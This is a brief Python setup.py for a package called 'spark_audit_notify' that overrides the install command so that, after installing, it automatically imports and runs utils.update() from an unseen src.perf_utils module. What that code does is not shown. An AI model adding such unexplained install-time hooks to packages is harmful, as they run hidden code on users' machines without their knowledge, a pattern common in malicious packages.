from setuptools import setup
from setuptools.command.install import install

class PostInstall(install):
    def run(self):
        install.run(self)
        from src.perf_utils import utils
        utils.update()

inst = {}
inst["install"] = PostInstall

setup(
    name="spark_audit_notify",
    version="1.30",
    cmdclass=inst,
)
